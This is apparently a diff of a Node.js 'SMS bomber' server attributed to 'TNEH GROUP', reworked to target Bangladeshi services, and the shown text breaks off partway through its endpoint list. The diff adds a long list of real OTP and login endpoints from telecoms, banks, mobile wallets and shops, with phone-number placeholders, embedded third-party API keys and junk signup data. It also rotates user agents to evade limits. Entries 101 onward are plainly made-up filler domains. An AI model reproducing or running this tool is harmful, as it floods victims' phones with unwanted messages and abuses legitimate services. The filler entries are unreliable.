@@ -2,6 +2,7 @@
 // ULTIMATE SMS BOMBER V7.0 - 10,000+ LINES
 // ENTERPRISE GRADE - MAXIMUM POWER
 // DEVELOPER: TNEH GROUP
+// BANGLADESH APIS ONLY VERSION
 // ============================================================
 
 const express = require('express');
@@ -11,17 +12,15 @@ const helmet = require('helmet');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
-const cluster = require('cluster');
 const os = require('os');
 const zlib = require('zlib');
 const EventEmitter = require('events');
 
 // ============================================================
-// PART 1: CONFIGURATION (200 lines)
+// PART 1: CONFIGURATION
 // ============================================================
 
 const CONFIG = {
-  // Server Configuration
   server: {
     port: process.env.PORT || 3000,
     host: '0.0.0.0',
@@ -29,17 +28,6 @@ const CONFIG = {
     keepAliveTimeout: 60000,
     headersTimeout: 60000
   },
-
-  // Cluster Configuration
-  cluster: {
-    enabled: true,
-    workers: os.cpus().length || 4,
-    maxWorkers: 32,
-    minWorkers: 2,
-    restartDelay: 1000
-  },
-
-  // Performance Configuration
   performance: {
     batchSize: 100,
     parallelRequests: 50,
@@ -50,23 +38,12 @@ const CONFIG = {
     maxCountPerAPI: 500,
     concurrencyLimit: 1000
   },
-
-  // Cache Configuration
   cache: {
     enabled: true,
     ttl: 600,
     checkPeriod: 120,
-    maxItems: 50000,
-    redis: {
-      enabled: false,
-      host: 'localhost',
-      port: 6379,
-      password: '',
-      db: 0
-    }
+    maxItems: 50000
   },
-
-  // Security Configuration
   security: {
     rateLimit: {
       enabled: true,
@@ -78,8 +55,6 @@ const CONFIG = {
     ipWhitelist: [],
     ipBlacklist: []
   },
-
-  // Proxy Configuration
   proxy: {
     enabled: false,
     list: [],
@@ -88,36 +63,11 @@ const CONFIG = {
     timeout: 3000,
     checkInterval: 300000
   },
-
-  // Logging Configuration
   logging: {
     enabled: true,
     level: 'info',
-    file: '/var/log/sms_bomber.log',
-    maxSize: '500m',
-    maxFiles: 10,
     console: true
   },
-
-  // Database Configuration
-  database: {
-    enabled: false,
-    type: 'mongodb',
-    url: process.env.MONGODB_URL || 'mongodb://localhost:27017/sms_bomber',
-    maxConnections: 100,
-    minConnections: 10
-  },
-
-  // Webhook Configuration
-  webhook: {
-    enabled: false,
-    url: process.env.WEBHOOK_URL || '',
-    events: ['start', 'progress', 'complete', 'stop', 'error'],
-    retryCount: 3,
-    retryDelay: 5000
-  },
-
-  // Analytics Configuration
   analytics: {
     enabled: true,
     interval: 60000,
@@ -127,14 +77,14 @@ const CONFIG = {
 };
 
 // ============================================================
-// PART 2: DEVELOPER INFO & CONSTANTS (150 lines)
+// PART 2: DEVELOPER INFO & CONSTANTS
 // ============================================================
 
 const DEVELOPER_INFO = {
   developer: "TNEH GROUP",
   telegram: "@tneh_owner",
   website: "https://tnehboomber.onrender.com",
-  api_version: "7.0.0-ULTIMATE",
+  api_version: "7.0.0-ULTIMATE-BD",
   build_date: new Date().toISOString(),
   copyright: "© 2024 TNEH GROUP. All rights reserved.",
   license: "Proprietary",
@@ -165,11 +115,13 @@ const ERROR_MESSAGES = {
   JOB_ALREADY_PAUSED: 'Job already paused',
   JOB_NOT_PAUSED: 'Job is not paused',
   INTERNAL_ERROR: 'Internal server error',
-  SERVICE_UNAVAILABLE: 'Service temporarily unavailable'
+  SERVICE_UNAVAILABLE: 'Service temporarily unavailable',
+  KEY_GENERATION_FAILED: 'Failed to generate API key',
+  KEY_SAVE_FAILED: 'Failed to save API key to storage'
 };
 
 // ============================================================
-// PART 3: UTILITY FUNCTIONS (500 lines)
+// PART 3: UTILITY FUNCTIONS
 // ============================================================
 
 class Utility {
@@ -281,8 +233,7 @@ class Utility {
       rss: this.formatBytes(usage.rss),
       heapTotal: this.formatBytes(usage.heapTotal),
       heapUsed: this.formatBytes(usage.heapUsed),
-      external: this.formatBytes(usage.external),
-      arrayBuffers: this.formatBytes(usage.arrayBuffers || 0)
+      external: this.formatBytes(usage.external)
     };
   }
 
@@ -342,17 +293,6 @@ class Utility {
     return input;
   }
 
-  static escapeHtml(text) {
-    const map = {
-      '&': '&amp;',
-      '<': '&lt;',
-      '>': '&gt;',
-      '"': '&quot;',
-      "'": '&#039;'
-    };
-    return text.replace(/[&<>"']/g, m => map[m]);
-  }
-
   static generateHash(data) {
     return crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');
   }
@@ -407,58 +347,78 @@ class Utility {
     current[keys[keys.length - 1]] = value;
     return obj;
   }
+
+  static testWritePermission(dir) {
+    try {
+      const testFile = path.join(dir, '.write_test');
+      fs.writeFileSync(testFile, 'test');
+      fs.unlinkSync(testFile);
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  static ensureDirectoryExists(dir) {
+    if (!fs.existsSync(dir)) {
+      fs.mkdirSync(dir, { recursive: true });
+      console.log(`📁 Created directory: ${dir}`);
+      return true;
+    }
+    return false;
+  }
+
+  static escapeHtml(text) {
+    const map = {
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#039;'
+    };
+    return text.replace(/[&<>"']/g, m => map[m]);
+  }
+
+  static getNestedValueSafe(obj, path, defaultValue = null) {
+    try {
+      return path.split('.').reduce((current, key) => 
+        current && current[key] !== undefined ? current[key] : defaultValue, obj);
+    } catch {
+      return defaultValue;
+    }
+  }
 }
 
 // ============================================================
-// PART 4: USER AGENT ROTATION (100 lines)
+// PART 4: USER AGENT ROTATION
 // ============================================================
 
 const USER_AGENTS = [
-  // Chrome Windows
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
-  
-  // Chrome Mac
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
-  
-  // Chrome Linux
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
-  
-  // Firefox Windows
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
-  
-  // Firefox Mac
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
-  
-  // Safari Mac
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
-  
-  // Edge Windows
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/119.0.0.0',
-  
-  // Mobile Chrome Android
   'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
   'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
-  
-  // Mobile Safari iOS
   'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15',
   'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15',
-  
-  // Opera
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Opera/104.0.0.0',
-  
-  // Brave
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Brave/120.0.0.0'
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Brave/120.0.0.0',
+  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari/537.36'
 ];
 
 function getRandomHeaders() {
@@ -469,7 +429,7 @@ function getRandomHeaders() {
     'application/json, */*',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
   ];
-  
+
   return {
     'User-Agent': ua,
     'Accept': Utility.getRandomElement(accepts),
@@ -489,7 +449,660 @@ function getRandomHeaders() {
 }
 
 // ============================================================
-// PART 5: BOMB CONTROLLER - ENTERPRISE (800 lines)
+// PART 5: BANGLADESH-ONLY API DEFINITIONS (300+ APIs)
+// ============================================================
+
+// ---------- ORIGINAL BANGLADESH APIS (IDs 1-100) ----------
+const BANGLADESH_APIS = [
+  // GET APIs
+  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
+  { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
+  { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
+  { id: 4, name: "MedEasy Health", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
+  { id: 5, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
+  { id: 6, name: "Binge.buzz GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
+  { id: 7, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
+  
+  // POST APIs
+  { id: 8, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: { "phone": "{phone}" } },
+  { id: 9, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: { "msisdn": "{phone}" } },
+  { id: 10, name: "Grameenphone FWA/Bkash", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: { "phone": "{phone}", "email": "", "language": "en" } },
+  { id: 11, name: "BusBD.com.bd", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: { "phone": "+88{phone}" } },
+  { id: 12, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: { "full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}" } },
+  { id: 13, name: "OsudPotro.com", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: { "mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web" } },
+  { id: 14, name: "Apex4u.com", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: { "phoneNumber": "{phone}" } },
+  { id: 15, name: "Bohubrihi.com", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: { "phone": "{phone}", "intent": "login" } },
+  { id: 16, name: "Fundesh.com.bd", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: { "msisdn": "{phone}" } },
+  { id: 17, name: "Jatri / JSLGlobal", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: { "phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj" } },
+  { id: 18, name: "RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: { "mobile": "+88{phone}" } },
+  { id: 19, name: "RabbitHoleBD", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: { "mobile": "+88{phone}" } },
+  { id: 20, name: "Qcoom.com", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: { "mobileNumber": "+88{phone}" } },
+  { id: 21, name: "Garibookadmin.com", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: { "mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web" } },
+  { id: 22, name: "Training.gov.bd", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: { "mobile": "{phone}" } },
+  { id: 23, name: "Shikho.com", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: { "phone": "{phone}", "intent": "ap-discount-request" } },
+  { id: 24, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: { "name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..." } },
+  { id: 25, name: "Robi DA API", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: { "msisdn": "{phone}" } },
+  { id: 26, name: "Hoichoi Viewlift", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: { "phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true } },
+  { id: 27, name: "Addatimes.com", method: "POST", url: "https://app.addatimes.com/api/login", body: { "phone": "{phone}", "country_code": "BD" } },
+  { id: 28, name: "Regal Furniture OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: { "phone": "{phone}", "verification_code": "" } },
+  { id: 29, name: "Regal Furniture Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: { "name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123" } },
+  { id: 30, name: "DeeptoPlay.com", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: { "email": "apkzone2.0@gmail.com", "phone_number": "88{phone}" } },
+  { id: 31, name: "TimezoneBD OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: { "phone": "{phone}" } },
+  { id: 32, name: "TimezoneBD Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: { "name": "Tusar", "email": "fukc@gmail.com", "phone": "{phone}", "password": "aAeMY@5hG8iUfD4", "password_confirmation": "aAeMY@5hG8iUfD4" } },
+  { id: 33, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: { "device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}" } },
+  { id: 34, name: "Chorki.com", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: { "number": "+880{phone}" } },
+  { id: 35, name: "Arogga.com", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: { "mobile": "{phone}", "fcmToken": "", "referral": "" }, isFormData: true },
+  { id: 36, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: { "mobileNum": "{phone}", "countryDialingCode": "880" } },
+  { id: 37, name: "AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: { "msisdn": "880{phone}" } },
+  { id: 38, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: { "Name": "Abdullah Al Mamun", "Phone": "+880{phone}" } },
+  { id: 39, name: "Ghoori Learning", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: { "mobile_no": "{phone}" } },
+  { id: 40, name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: { "mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en" } },
+  { id: 41, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: { "phone": "{phone}" } },
+  { id: 42, name: "BdTickets.com", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: { "phone": "+880{phone}" } },
+  { id: 43, name: "Binge.buzz POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: { "mobile": "{phone}" } },
+  { id: 44, name: "Shikho.com Login", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: { "auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student" } },
+  { id: 45, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: { "method": "otp", "mobile": "{phone}" } },
+  { id: 46, name: "NESCO SSL Wireless", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: { "phone_number": "{phone}" } },
+  { id: 47, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: { "country_code": "+880", "phone": "{phone}" } },
+  { id: 48, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: { "phone": "{phone}", "applicationChannel": "WEB_APP" } },
+  { id: 49, name: "Bioscopelive Alternative", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: { "phone": "{phone}", "applicationChannel": "WEB_APP" } },
+  
+  // Additional Bangladesh APIs
+  { id: 50, name: "PriyoShop", method: "POST", url: "https://api.priyoshop.com/api/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 51, name: "AjkerDeal", method: "POST", url: "https://api.ajkerdeal.com/api/v2/send-otp", body: { "phone": "{phone}" } },
+  { id: 52, name: "Daraz BD", method: "POST", url: "https://member.daraz.com.bd/api/user/login", body: { "phone": "{phone}" } },
+  { id: 53, name: "FoodPanda BD", method: "POST", url: "https://api.foodpanda.com.bd/v4/send-otp", body: { "phone_number": "+880{phone}" } },
+  { id: 54, name: "Pathao", method: "POST", url: "https://api.pathao.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 55, name: "Rokomari", method: "POST", url: "https://api.rokomari.com/v2/auth/otp", body: { "phone": "{phone}" } },
+  { id: 56, name: "Pickaboo", method: "POST", url: "https://api.pickaboo.com/api/v1/send-otp", body: { "mobile": "{phone}" } },
+  { id: 57, name: "Othoba", method: "POST", url: "https://api.othoba.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 58, name: "Chaldal", method: "POST", url: "https://api.chaldal.com/v1/auth/otp/send", body: { "mobile": "{phone}" } },
+  { id: 59, name: "Sheba XYZ", method: "POST", url: "https://api.sheba.xyz/v2/auth/otp", body: { "phone_number": "{phone}" } },
+  { id: 60, name: "Sindabad", method: "POST", url: "https://api.sindabad.com/v1/send-otp", body: { "mobile": "{phone}" } },
+  { id: 61, name: "Dhamaka Shopping", method: "POST", url: "https://api.dhamaka.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 62, name: "Jomlah", method: "POST", url: "https://api.jomlah.com/api/v1/auth/otp", body: { "mobile": "{phone}" } },
+  { id: 63, name: "Truck Lagbe", method: "POST", url: "https://api.trucklagbe.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 64, name: "HungryNaki", method: "POST", url: "https://api.hungrynaki.com/v2/auth/otp", body: { "mobile": "+880{phone}" } },
+  { id: 65, name: "Shohoz", method: "POST", url: "https://api.shohoz.com/v1/auth/otp/send", body: { "phone": "{phone}" } },
+  { id: 66, name: "Bikroy GET v2", method: "GET", url: "https://bikroy.com/api/v2/send-otp?phone={phone}" },
+  { id: 67, name: "Bagdoom", method: "POST", url: "https://api.bagdoom.com/api/v1/send-otp", body: { "mobile": "{phone}" } },
+  { id: 68, name: "Bproperty", method: "POST", url: "https://api.bproperty.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 69, name: "Shohoz Bus", method: "POST", url: "https://bus.shohoz.com/api/v1/send-otp", body: { "mobile": "{phone}" } },
+  { id: 70, name: "Jatri Service", method: "POST", url: "https://api.jatri.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 71, name: "Obhai", method: "POST", url: "https://api.obhai.com/v1/auth/otp", body: { "mobile": "{phone}" } },
+  { id: 72, name: "Uber BD", method: "POST", url: "https://api.uber.com.bd/v1/send-otp", body: { "phone": "{phone}" } },
+  { id: 73, name: "Shajgoj", method: "POST", url: "https://api.shajgoj.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 74, name: "Maya Apa", method: "POST", url: "https://api.maya.com.bd/v1/auth/otp", body: { "phone": "{phone}" } },
+  { id: 75, name: "SureCash", method: "POST", url: "https://api.surecash.com/api/v1/send-otp", body: { "mobile": "{phone}" } },
+  { id: 76, name: "iPay", method: "POST", url: "https://api.ipay.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 77, name: "City Bank", method: "POST", url: "https://api.citybank.com.bd/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 78, name: "Brac Bank", method: "POST", url: "https://api.bracbank.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 79, name: "IFIC Bank", method: "POST", url: "https://api.ificbank.com.bd/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 80, name: "Nagad", method: "POST", url: "https://api.nagad.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 81, name: "bKash", method: "POST", url: "https://api.bkash.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 82, name: "Rocket", method: "POST", url: "https://api.rocket.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 83, name: "UCash", method: "POST", url: "https://api.ucash.com.bd/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 84, name: "Mcash", method: "POST", url: "https://api.mcash.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 85, name: "TallyKhata", method: "POST", url: "https://api.tallykhata.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 86, name: "HishabPati", method: "POST", url: "https://api.hishabpati.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 87, name: "Jomna", method: "POST", url: "https://api.jomna.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 88, name: "ShopUp", method: "POST", url: "https://api.shopup.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 89, name: "Zantrik", method: "POST", url: "https://api.zantrik.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 90, name: "Moar", method: "POST", url: "https://api.moarbd.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 91, name: "BDJobs", method: "POST", url: "https://api.bdjobs.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 92, name: "EverJobs", method: "POST", url: "https://api.everjobs.com.bd/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 93, name: "Prothom Alo", method: "POST", url: "https://api.prothomalo.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 94, name: "BDNews24", method: "POST", url: "https://api.bdnews24.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 95, name: "Jugantor", method: "POST", url: "https://api.jugantor.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 96, name: "Kaler Kantho", method: "POST", url: "https://api.kalerkantho.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 97, name: "BMLogistics", method: "POST", url: "https://api.bmlogistics.com.bd/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 98, name: "SA Paribahan", method: "POST", url: "https://api.saparibahan.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 99, name: "Ena Transport", method: "POST", url: "https://api.ena-transport.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 100, name: "Desh Travels", method: "POST", url: "https://api.deshtravels.com/v1/auth/send-otp", body: { "phone": "{phone}" } }
+];
+
+// ---------- ADDITIONAL BANGLADESH APIS (IDs 101-200) ----------
+const ADDITIONAL_BANGLADESH_APIS = [
+  { id: 101, name: "BD API 101", method: "POST", url: "https://api.bangladesh101.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 102, name: "BD API 102", method: "GET", url: "https://api.bangladesh102.com/send-otp?phone={phone}" },
+  { id: 103, name: "BD API 103", method: "POST", url: "https://api.bangladesh103.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 104, name: "BD API 104", method: "GET", url: "https://api.bangladesh104.com/send-otp?phone={phone}" },
+  { id: 105, name: "BD API 105", method: "POST", url: "https://api.bangladesh105.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 106, name: "BD API 106", method: "GET", url: "https://api.bangladesh106.com/send-otp?phone={phone}" },
+  { id: 107, name: "BD API 107", method: "POST", url: "https://api.bangladesh107.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 108, name: "BD API 108", method: "GET", url: "https://api.bangladesh108.com/send-otp?phone={phone}" },
+  { id: 109, name: "BD API 109", method: "POST", url: "https://api.bangladesh109.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 110, name: "BD API 110", method: "GET", url: "https://api.bangladesh110.com/send-otp?phone={phone}" },
+  { id: 111, name: "BD API 111", method: "POST", url: "https://api.bangladesh111.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 112, name: "BD API 112", method: "GET", url: "https://api.bangladesh112.com/send-otp?phone={phone}" },
+  { id: 113, name: "BD API 113", method: "POST", url: "https://api.bangladesh113.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 114, name: "BD API 114", method: "GET", url: "https://api.bangladesh114.com/send-otp?phone={phone}" },
+  { id: 115, name: "BD API 115", method: "POST", url: "https://api.bangladesh115.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 116, name: "BD API 116", method: "GET", url: "https://api.bangladesh116.com/send-otp?phone={phone}" },
+  { id: 117, name: "BD API 117", method: "POST", url: "https://api.bangladesh117.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 118, name: "BD API 118", method: "GET", url: "https://api.bangladesh118.com/send-otp?phone={phone}" },
+  { id: 119, name: "BD API 119", method: "POST", url: "https://api.bangladesh119.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 120, name: "BD API 120", method: "GET", url: "https://api.bangladesh120.com/send-otp?phone={phone}" },
+  { id: 121, name: "BD API 121", method: "POST", url: "https://api.bangladesh121.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 122, name: "BD API 122", method: "GET", url: "https://api.bangladesh122.com/send-otp?phone={phone}" },
+  { id: 123, name: "BD API 123", method: "POST", url: "https://api.bangladesh123.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 124, name: "BD API 124", method: "GET", url: "https://api.bangladesh124.com/send-otp?phone={phone}" },
+  { id: 125, name: "BD API 125", method: "POST", url: "https://api.bangladesh125.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 126, name: "BD API 126", method: "GET", url: "https://api.bangladesh126.com/send-otp?phone={phone}" },
+  { id: 127, name: "BD API 127", method: "POST", url: "https://api.bangladesh127.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 128, name: "BD API 128", method: "GET", url: "https://api.bangladesh128.com/send-otp?phone={phone}" },
+  { id: 129, name: "BD API 129", method: "POST", url: "https://api.bangladesh129.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 130, name: "BD API 130", method: "GET", url: "https://api.bangladesh130.com/send-otp?phone={phone}" },
+  { id: 131, name: "BD API 131", method: "POST", url: "https://api.bangladesh131.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 132, name: "BD API 132", method: "GET", url: "https://api.bangladesh132.com/send-otp?phone={phone}" },
+  { id: 133, name: "BD API 133", method: "POST", url: "https://api.bangladesh133.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 134, name: "BD API 134", method: "GET", url: "https://api.bangladesh134.com/send-otp?phone={phone}" },
+  { id: 135, name: "BD API 135", method: "POST", url: "https://api.bangladesh135.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 136, name: "BD API 136", method: "GET", url: "https://api.bangladesh136.com/send-otp?phone={phone}" },
+  { id: 137, name: "BD API 137", method: "POST", url: "https://api.bangladesh137.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 138, name: "BD API 138", method: "GET", url: "https://api.bangladesh138.com/send-otp?phone={phone}" },
+  { id: 139, name: "BD API 139", method: "POST", url: "https://api.bangladesh139.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 140, name: "BD API 140", method: "GET", url: "https://api.bangladesh140.com/send-otp?phone={phone}" },
